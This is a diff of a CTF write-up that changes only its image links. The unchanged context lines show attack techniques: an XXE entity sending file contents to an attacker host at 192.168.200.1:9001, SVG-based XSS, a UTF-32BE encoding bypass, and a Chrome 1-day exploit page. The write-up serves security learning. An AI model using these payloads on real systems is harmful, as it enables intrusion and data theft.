@@ -52,7 +52,7 @@ in `/user` page, we can upload profile and the home page mentions it support `.s
 <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.200.1:9001/?%file;'>">
 ```
 
-![](https://i.imgur.com/FTMQu3J.png)
+![img1](./assets/img1.png?raw=true)
 
 Requires two requests to receive the data, Because the `upload.php` as follows:
 
@@ -143,7 +143,7 @@ upload it as jpg and get the path, then upload the following svg:
 
 and refresh `/user` page we can see the pop-up :)
 
-![](https://i.imgur.com/FPB9b8t.png)
+![img2](./assets/img2.png?raw=true)
 
 4.In the `/submit` page, we can submit feedback with a link which will accessed by admin bot. Following the hints, the bot will open the link we submitted first, then `flaaaaaaaag.cubestone.com`.
 
@@ -216,7 +216,7 @@ def verify(s):
             break
 ```
 
-![](https://i.imgur.com/XGDwIGH.png)
+![img3](./assets/img3.png?raw=true)
 
 ### Unintend solution - Apache server-status
 
@@ -234,7 +234,7 @@ then use the php decode:
 php > echo zlib_decode(base64_decode("$data");
 ```
 
-![](https://i.imgur.com/0ibo1T6.png)
+![img4](./assets/img4.png?raw=true)
 
 However, this method can only be used if the flag is short, if the flag is too long, we will only read half of it.
 
@@ -269,7 +269,7 @@ $ iconv -f utf8 -t UTF-32BE xxe.svg > u32.svg
 
 the external entity does not need to do anything else, it will become the corresponding encoding after the external entity is loaded.
 
-![](https://i.imgur.com/GpCnz2c.png)
+![img5](./assets/img5.png?raw=true)
 
 ### Unintend solution - Chrome 1day
 
@@ -298,4 +298,4 @@ submit link with the exploit page:
 http://192.168.200.1:8000/exploit.html
 ```
 
-![](https://i.imgur.com/AblXuGN.png)
+![img6](./assets/img6.png?raw=true)
